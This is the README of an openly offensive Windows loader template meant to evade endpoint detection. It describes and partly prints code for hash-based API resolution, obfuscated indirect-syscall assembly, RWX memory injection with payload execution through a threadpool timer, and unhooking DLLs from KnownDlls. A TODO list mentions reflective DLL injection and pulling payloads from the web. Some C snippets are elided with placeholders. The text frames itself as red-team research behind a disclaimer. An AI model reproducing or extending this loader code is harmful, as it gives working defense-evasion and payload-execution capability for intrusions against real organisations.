# Lamia-Syscall-Template

![](assets/1.png)

# Disclaimer

This project and its related code are for educational and research purposes only. Users should comply with applicable laws and regulations and must not use this project for any illegal or unauthorized activities.

1. **Legal Usage**: This project aims to help security researchers, red team experts, and developers enhance their understanding and application of syscall techniques. Users must ensure this project is used in a legal and authorized environment.
2. **Liability Limitation**: The project author assumes no responsibility for any direct or indirect damages caused by using this project. Users bear all risks associated with using this project.
3. **Compliance**: Users must ensure that their use of this project complies with the laws and regulations of their respective countries or regions. The project author is not responsible for user compliance.

------

# Introduction

## Project Background and Objectives

In today’s cybersecurity landscape, enterprises and organizations face increasingly complex threats, especially from advanced persistent threats (APTs). These attacks are often carried out by highly skilled attackers using sophisticated tools and techniques to bypass traditional security defenses such as antivirus software and endpoint detection and response (EDR) systems.

The purpose of this project is to research and develop advanced red teaming techniques to help security experts simulate real-world attack scenarios, assess, and enhance organizational security defenses. Specific objectives include:

1. **Bypassing EDR Detection**: Using techniques such as API hashing, memory injection, and syscall hijacking to evade conventional EDR detection mechanisms and simulate realistic attack behaviors.
2. **Advanced Red Teaming Research**: Exploring and implementing the latest attack techniques and strategies to provide red teams with more powerful tools and methods for effective penetration testing and security assessment.
3. **APT Attack Simulation**: Developing foundational templates for simulating various stages of APT attacks, including initial access, persistence, privilege escalation, and lateral movement, to help organizations identify and address potential security vulnerabilities.

## Use Cases and Target Audience

**Use Cases**:

- APT attack simulation
- Security research and development
- Malware analysis and reverse engineering

**Target Audience**:

- Red team experts
- Security researchers
- Malware analysts
- Security developers

------

# Project Overview

## Project Architecture and Module Breakdown

This project focuses on syscall techniques to implement advanced red teaming methods and APT attack simulation. The architecture is divided into multiple modules, each responsible for specific functionalities to achieve comprehensive attack simulation and security research goals.

1. **API Hashing Module**
   - **File**: `ApiHashing.c`
   - **Functionality**: Provides API retrieval based on hash values to evade conventional API detection mechanisms.
2. **Memory Management and Injection Module**
   - **Files**: `main.c`, `Inject.c`
   - **Functionality**: Implements malicious code memory injection and execution, memory allocation management, and protection to ensure secure execution within target processes.
3. **Syscall Hijacking and Restoration Module**
   - **Files**: `Lamia.c`, `Common.c`
   - **Functionality**: Hijacks and restores syscalls, providing randomized syscall addresses to enhance stealth and effectiveness.
4. **DLL Unhooking Module**
   - **File**: `unhook.c`
   - **Functionality**: Restores system DLLs by loading unhooked DLLs from the KnownDlls directory, ensuring syscall integrity.
5. **Debugging and Logging Module**
   - **File**: `Debug.h`
   - **Functionality**: Provides debugging output and logging functionalities for tracking execution during development and testing.
6. **Utility Module**
   - **Files**: `Common.h`, `Structs.h`
   - **Functionality**: Defines common data structures and utility functions used throughout the project.
7. **Function Pointer Module**
   - **File**: `FunctionPointers.h`
   - **Functionality**: Defines function pointers for common Windows APIs to support dynamic retrieval and invocation.

------

# Technical Details

## API Hashing

### Implementation of `GetProcAddressH` and `GetModuleHandleH`

The purpose of the `GetProcAddressH` function is to retrieve the address of a specified function within a module using a hash value. Its implementation steps are as follows:

1. Parameter Validation:
   - Verify whether the passed module handle `hModule` and API hash value `uApiHash` are valid. If not, return `NULL`.
2. Retrieve the Export Table:
   - Use the module base address to obtain the DOS header and NT header.
   - Validate the NT header's signature for correctness.
   - Retrieve the address and size of the export directory.
3. Traverse Exported Functions:
   - Access the arrays for exported function names, addresses, and ordinals.
   - Iterate through each exported function name, compute its hash value, and compare it with `uApiHash`.
   - If a match is found, obtain the corresponding function address.
4. Handle Forwarded Functions:
   - Check whether the function address lies within the export directory range to determine if it is a forwarded function.
   - If it is a forwarded function, resolve the forwarded module name and function name, and recursively call `GetProcAddressH` to obtain the final function address.
5. Return the Result:
   - If a matching function address is found, return it; otherwise, return `NULL`.



The purpose of the `GetModuleHandleH` function is to retrieve the handle of a specified module using a hash value. Its implementation steps are as follows:

1. Retrieve the PEB (Process Environment Block):
   - Use `__readgsqword` to access the PEB of the current process.
2. Traverse the Module List:
   - Obtain the LDR (Loader) data from the PEB and iterate through the loaded module list.
   - For each module, retrieve its full path and convert it to lowercase.
3. Compute the Hash Value:
   - Calculate the hash values for the module's full path and lowercase path.
   - Compare the computed hash values with the passed `uModuleHash`.
4. Return the Result:
   - If a matching module is found, return its handle; otherwise, return `NULL`.



## Choice and Implementation Details of the Hash Algorithm

In the Lamia Syscall project, the `CityHash` function is used to calculate the hash value of a string. The implementation details are as follows:

```c
UINT32 CityHash(LPCSTR cString)
{
	int length = strlen(cString);
	UINT64 hash = FIRST_HASH;

	for (size_t i = 0; i < length; ++i) {
		hash ^= (UINT64)cString[i];
		hash *= SECOND_HASH;
	}

	hash ^= hash >> HASH_OFFSET;
	hash *= THIRD_HASH;
	hash ^= hash >> HASH_OFFSET;

	return hash;
}
```

**Implementation Steps**

1. **Initialize Hash Value:**
   - Use `FIRST_HASH` as the initial hash value, which is typically a large prime number. This helps reduce the probability of initial collisions.
2. **Iterative Computation:**
   - Iterate through each character of the input string and perform an XOR operation between it and the current hash value.
   - Multiply the result by `SECOND_HASH`, another large prime number, to increase the complexity of the hash value.
3. **Mixing and Compression:**
   - Perform right shifts and XOR operations to further scramble the hash value, reducing the probability of collisions.
   - Multiply the result by `THIRD_HASH` (another large prime) and perform a final round of mixing.
4. **Return Result:**
   - Finally, return a 32-bit hash value, which is suitable for fast lookups and comparisons.



## System Call Hijacking and Restoration

### Assembly Code Development and Obfuscation

### File Overview

`Lsyscall.asm` is an assembly language file that primarily defines two processes: `SetSSn` and `RunSyscall`. These processes involve the setup and execution of system calls and include obfuscation and disguise techniques to increase the difficulty of reverse engineering.

### Process Analysis

#### `SetSSn` Process

- **Initialization Phase**: The `xor eax, eax` instruction is used to clear the `eax` register, and both `wSystemCall` and `qSyscallInsAdress` are initialized to `0`.
- **Loop Logic**: Within the `LoopSSN` label, the `cmp eax, ecx` instruction compares `eax` with `ecx`. If they are equal, the process jumps to `EndLoop`; otherwise, `eax` is incremented, and the loop continues. This simulates a simple traversal process.
- **Result Handling**: Once the loop ends, the value of `eax` is set to `ecx`, and the variables `wSystemCall` and `qSyscallInsAdress` are updated to store the system call number and the address of the system call instruction, respectively.



```asm
; SetSSN :
; SetSSn PROC
	    ;	mov wSystemCall, 0h
	    ;	mov qSyscallInsAdress, 0h
	    ;	mov wSystemCall, ecx
	    ;	mov qSyscallInsAdress, rdx
	    ;	ret
	    ;SetSSn ENDP
```



```asm
SetSSn proc
    ; Initialization Phase: Clear registers and set initial values
        xor eax, eax                     ; eax = 0
        xor r9, r9                       ; r9 = 0
        xor r10, r10                     ; r10 = 0
        mov wSystemCall, eax             ; Initialize wSystemCall = 0
        mov qSyscallInsAdress, rax       ; Initialize qSyscallInsAdress = 0

    ; Introduce Fake Logic: Save and restore ecx
        mov r10d, ecx                    ; Temporarily save ecx to r10d
        xor ecx, ecx                     ; Clear ecx
        lea ecx, [r10]                   ; Restore ecx, using LEA for obfuscation

    ; Fake Branch: Create a deceptive logical path
        cmp ecx, 0                       ; Check if ecx is 0
        jne LamiaPart1                   ; If not 0, jump to fake logic
        jmp ContinueLoop                 ; Otherwise, go to the main logic

    LamiaPart1:
        ; Meaningless complex logic block to confuse reverse engineers
        inc r8                           ; Fake system call address
        xor r9, r8                       ; Add obfuscation operations
        test r9, r8                      ; Fake conditional test, no actual effect
        nop                              ; Maintain execution flow

    ContinueLoop:
        ; Main Loop Logic: Simulate SSN traversal
        LoopSSN:
            cmp eax, ecx                 ; Compare eax and ecx
            je EndLoop                   ; If equal, exit the loop
            inc eax                      ; Increment eax
            jnz LoopSSN                  ; Obfuscated branch
            jmp LoopSSN                  ; Return to the start of the loop
    EndLoop:

    ; Result Processing Phase
    xor r9, r9                       ; Clear r9
    mov wSystemCall, eax             ; Save the final SSN to wSystemCall
    mov r8, rdx                      ; Get the syscall instruction address to r8
    mov qSyscallInsAdress, r8        ; Save the address to qSyscallInsAdress

    ; Introduce Stack Operations to Increase Complexity
    push rax                         ; Push rax onto the stack
    pop rax                          ; Restore rax from the stack
    xor rax, rax                     ; Add extra clearing operation

    ret                              ; Return
SetSSn endp

```



#### `RunSyscall` Process

- **Initialization Phase**: The `xor eax, eax` instruction clears the `eax` register to prepare for the subsequent loop.
- **Loop Logic**: In the `LoopSyscall` label, the `cmp eax, wSystemCall` instruction compares `eax` with `wSystemCall`. If they are equal, the process jumps to `Run`; otherwise, `eax` is incremented, and the loop continues. This code is used to locate the matching system call number.
- **Execution Phase**: Once the matching system call number is found, the program jumps to the address pointed to by `qSyscallInsAdress` and executes the corresponding system call.



```asm
; RunSyscall :
; RunSyscall PROC
	    ;	mov r10, rcx
	    ;	mov eax, wSystemCall
	    ;	jmp qword ptr [qSyscallInsAdress]
	    ;	ret
	    ;RunSyscall ENDP
```



```asm
RunSyscall proc
    ; Initialization Phase: Prepare registers
        xor r10, r10                     ; r10 = 0
        mov rax, rcx                     ; rax = rcx
        mov r10, rax                     ; r10 = rax = rcx
        xor eax, eax                     ; eax = 0

    ; Main Loop: Match the system call
    LoopSyscall:
        cmp eax, wSystemCall             ; Compare eax with wSystemCall
        je Run                           ; If they match, jump to Run
        inc eax                          ; Increment eax
        jmp LoopSyscall                  ; Repeat the loop

    ; Irrelevant Dead Code: Designed to confuse reverse engineers
        xor eax, eax                     ; Dead code, will not execute
        xor rcx, rcx                     ; Dead code, will not execute
        shl r10, 2                       ; Dead code, will not execute
        shl r8, 2                        ; Dead code, will not execute

    ; Execution Phase: Jump to the system call address
    Run:
        jmp qword ptr [qSyscallInsAdress]; Jump to the system call address

    ; Cleanup Phase
        xor r10, r10                     ; r10 = 0
        mov qSyscallInsAdress, r10       ; Clear qSyscallInsAdress
        ret                              ; Return
RunSyscall endp

```



### Implementation of `FetchLamiaSyscall` and `FetchWin32uSyscall`

#### Implementation of `FetchLamiaSyscall`

The purpose of the `FetchLamiaSyscall` function is to retrieve the service number (SSN) of a specified system call and a randomized system call address from `ntdll.dll`. The implementation steps are as follows:

1. **Initialize Module Configuration**:
   - Check whether `g_NtdllConfig` has been initialized. If not, call `InitialDllsConfigStructs` to initialize the export table information for `ntdll.dll`.
2. **Iterate Through Exported Functions**:
   - Traverse the exported function names of `ntdll.dll` and compute the hash value of each function name.
   - Compare the computed hash values with the provided `Syshash`.
3. **Locate the System Call**:
   - If a matching function name is found, check whether its corresponding function address contains a system call instruction.
   - If the address is not hooked, directly retrieve the service number (SSN).
   - If the address is hooked, inspect the neighboring system call instructions, compute, and adjust the service number accordingly.
4. **Return Results**:
   - If a matching system call is found, set `pLamiaSys->SSN` and `pLamiaSys->pSyscallRandomAdr` and return `TRUE`.

```c
BOOL FetchLamiaSyscall(IN DWORD Syshash, OUT PLAMIA_SYSCALL pLamiaSys) {
	// Initialize ntdll config if not already done
	if (!g_NtdllConfig.bInitialized) {
		if (!InitialDllsConfigStructs(&g_NtdllConfig, GetModuleHandleH(ntdlldll_CH))) {
			return FALSE;
		}
	}

	// Traverse ntdll export functions
	for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames; i++) {
		PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
		PVOID pFuncAddress = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);

		// Check if hash matches
		if (CHASH(pcFuncName) == Syshash) {
			// Check if syscall is not hooked
			if (/* check for syscall instruction */) {
				// Set SSN and address
				pLamiaSys->SSN = /* extract SSN */;
				pLamiaSys->pSyscallRandomAdr = pFuncAddress;
				return TRUE;
			}
			// Handle hooked syscall scenarios
			// ...
		}
	}
	return FALSE;
}
```



#### Implementation of `FetchWin32uSyscall`

The purpose of the `FetchWin32uSyscall` function is to randomly retrieve the address of a system call from `win32u.dll`. The implementation steps are as follows:

1. **Initialize Module Configuration**:
   - Check whether `g_Win32uConfig` has been initialized. If not, call `InitialDllsConfigStructs` to initialize the export table information for `win32u.dll`.
2. **Randomly Select a System Call**:
   - Generate a random number `SEED` to select a random system call.
   - Traverse the exported function names of `win32u.dll`
     - Check whether the corresponding function address contains a system call instruction.
     - Use `SEED` to select a random system call address.
3. **Return Results**:
   - If a matching system call address is found, set `*ppSyscallRandomAddress` and return `TRUE`.

```c
BOOL FetchWin32uSyscall(OUT PVOID* ppSyscallRandomAddress) {
    // Initialize win32u config if not already done
    if (!g_Win32uConfig.bInitialized) {
        if (!InitialDllsConfigStructs(&g_Win32uConfig, GetModuleHandleH(win32udll_CH))) {
            return FALSE;
        }
    }

    // Generate a random seed
    int SEED = GernerateRandomInt() % 0x10;

    // Traverse win32u export functions
    for (DWORD i = 0; i < g_Win32uConfig.dwNumberOfNames; i++) {
        PCHAR pcFuncName = (PCHAR)(g_Win32uConfig.uModule + g_Win32uConfig.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(g_Win32uConfig.uModule + g_Win32uConfig.pdwArrayOfAddresses[g_Win32uConfig.pwArrayOfOrdinals[i]]);

        // Check for syscall instruction
        if (/* check for syscall instruction */) {
            // Use SEED to select a random syscall
            *ppSyscallRandomAddress = pFuncAddress;
            return TRUE;
        }
    }
    return FALSE;
}
```







------

## Memory Management and Injection

### Code Injection Strategy and Implementation

#### Implementation of the `InjectPayload` Function

1. **Memory Allocation**:
   - Use the `NtAllocateVirtualMemory` system call to allocate memory in the current process. Initially, allocate a read-only page, then adjust the address and size for subsequent operations.
   - Allocate memory in chunks through a loop, where each allocation corresponds to one page size (4096 bytes), and set the memory to read/write access.
2. **Memory Protection**:
   - In a second loop, use `NtProtectVirtualMemory` to set the permissions of the allocated memory pages to executable, readable, and writable (RWX), enabling subsequent writing and execution.
3. **Write Payload**:
   - Write the payload data into the allocated memory page by page, using the `Memcpy` function for memory copying.
4. **Return Results**:
   - Return the address of the injected payload to the caller.

```c
BOOL InjectPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload)
{
    // ... existing code ...
    sNewPayloadSize = SET_TO_MULTIPLE_OF_4096(sPayloadSize) + PAGE_SIZE;
    
    // Allocate memory
    SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
    if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY))) {
        // ... error handling ...
        return FALSE;
    }

    // Adjust base address and size
    sNewPayloadSize -= PAGE_SIZE;
    pAddress = (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);

    // Commit memory with RW permissions
    for (DWORD i = 0; i < ii; i++) {
        // ... allocate and commit memory ...
    }

    // Change memory to RWX
    for (DWORD i = 0; i < ii; i++) {
        // ... change protection ...
    }

    // Write payload
    for (DWORD i = 0; i < ii; i++) {
        Memcpy(pTmpAddress, pTmpPayload, PAGE_SIZE);
        // ... adjust pointers ...
    }
    *pInjectedPayload = pAddress;
    return TRUE;
}

```



#### Implementation of the `ExecutePayload` Function

1. **Retrieve Function Pointers**:
   - Use `GetProcAddressH` and `GetModuleHandleH` to retrieve function pointers for `CreateThreadpoolTimer`, `SetThreadpoolTimer`, and `WaitForSingleObject`.
2. **Initialize Thread Pool Environment**:
   - Use `InitializeThreadpoolEnvironment` to initialize the thread pool environment.
3. **Create Thread Pool Timer**:
   - Use `CreateThreadpoolTimer` to create a thread pool timer, setting the injected payload as the callback function.
4. **Set the Timer**:
   - Configure the timer to trigger after `PAYLOAD_EXECUTION_DELAY` seconds.
5. **Wait for Execution**:
   - Use `WaitForSingleObject` to wait indefinitely, ensuring that the payload executes.



```c
VOID ExecutePayload(IN PVOID pInjectedPayload) {
    // ... existing code ...
    if (!pInjectedPayload) return;

    // Get function pointers
    fnCreateThreadpoolTimer pCreateThreadpoolTimer = (fnCreateThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_CH), CreateThreadpoolTimer_CH);
    fnSetThreadpoolTimer pSetThreadpoolTimer = (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_CH), SetThreadpoolTimer_CH);
    fnWaitForSingleObject pWaitForSingleObject = (fnWaitForSingleObject)GetProcAddressH(GetModuleHandleH(kernel32dll_CH), WaitForSingleObject_CH);

    if (!pCreateThreadpoolTimer || !pSetThreadpoolTimer || !pWaitForSingleObject) {
        // ... error handling ...
        return;
    }

    // Initialize and set timer
    InitializeThreadpoolEnvironment(&tpCallbackEnv);
    if (!(ptpTimer = pCreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &tpCallbackEnv))) {
        // ... error handling ...
        return;
    }

    // Set timer to execute payload
    ulDueTime.QuadPart = (ULONGLONG)-(PAYLOAD_EXECUTION_DELAY * 10 * 1000 * 1000);
    pSetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);

    // Wait indefinitely
    pWaitForSingleObject((HANDLE)-1, INFINITE);
}
```





------

# DLL Unhooking

### File Overview

`unhook.c` is a program designed to remove DLL hooks. Its primary functionality involves loading unhooked versions of DLLs from the KnownDlls directory and overwriting the `.text` section of currently loaded DLLs in the process, effectively removing hooks. This file includes multiple functions and global variables primarily for handling DLL loading, memory mapping, and exception handling.

### Key Function Analysis

#### `MapDllFromKnownDllDir`

- **Functionality**: Loads the specified DLL from the KnownDlls directory.
- Implementation:
  - Constructs the full path to the DLL.
  - Opens the DLL's section using `NtOpenSection`.
  - Maps the section into the current process's address space using `NtMapViewOfSection`.
  - Returns the mapped module's address.

#### `VectoredExceptionHandler`

- **Functionality**: Handles exceptions, particularly access violations.
- Implementation:
  - Checks if the exception code is `EXCEPTION_ACCESS_VIOLATION` and whether the exception address lies within the local `.text` section.
  - If true, modifies memory protection using `NtProtectVirtualMemory` to allow writing.
  - Copies the unhooked `.text` section to the local memory using `Memcpy`.
  - Returns `EXCEPTION_CONTINUE_EXECUTION` to continue execution.

#### `UnhookAllLoadedDlls`

- **Functionality**: Removes hooks from all loaded DLLs.
- Implementation:
  - Retrieves the module list from the PEB structure.
  - Iterates through the module list, skipping the first entry (typically the executable itself).
  - For each DLL, uses `MapDllFromKnownDllDir` to load an unhooked version.
  - Finds the `.text` section and compares the local version with the unhooked version.
  - If differences are found, modifies memory protection using `NtProtectVirtualMemory` to allow writing.
  - Copies the unhooked `.text` section using `Memcpy`.
  - Restores memory protection.
  - Unmaps the unhooked DLL using `NtUnmapViewOfSection`.

### Global Variables

- **`g_sTextSectionSize`, `g_pLocalTxtSectionAddress`, `g_pKnownDllTxtSectionAddress`**: Used to store the size and addresses of the `.text` section.
- **`g_Nt`**: Contains function pointers for various NT system calls.

### Code Obfuscation and Security

- Multiple system calls (e.g., `NtOpenSection`, `NtMapViewOfSection`, `NtProtectVirtualMemory`) are used to directly manipulate memory and DLLs.
- Includes an exception handling mechanism to ensure proper handling of access violations.



```c
// Load a DLL from KnownDlls directory
function MapDllFromKnownDllDir(dllName) {
    // Construct full DLL path
    // Initialize UNICODE_STRING and OBJECT_ATTRIBUTES
    // Open section for the DLL
    // Map section into the current process
    return mappedModule;
}

// Exception handler for access violations
function VectoredExceptionHandler(exceptionInfo) {
    // Check if exception is access violation within the text section
    if (isAccessViolationInTextSection(exceptionInfo)) {
        // Change memory protection to allow writing
        // Copy unhooked .text section
        return CONTINUE_EXECUTION;
    }
    return CONTINUE_SEARCH;
}

// Unhook all loaded DLLs
function UnhookAllLoadedDlls() {
    // Get PEB and module list
    // Skip the local executable image

    // Iterate over loaded DLLs
    while (moreModulesToProcess) {
        // Get DLL name and base address
        // Load unhooked DLL from KnownDlls

        // If both local and known DLLs are loaded
        if (localAndKnownDllsLoaded) {
            // Find .text section
            if (textSectionFound) {
                // Change memory protection to allow writing
                // Copy unhooked .text section
                // Restore original memory protection
            }
        }

        // Move to the next DLL
        // Unmap the known DLL if mapped
    }
}
```







# TODO

- [x] Applying indirect syscall technology to reflective DLL injection
- [ ] Getting Payload  from Resource
- [x] Getting Payload from web
- [x] Send information through the pipe to clear the RDI-DLL memory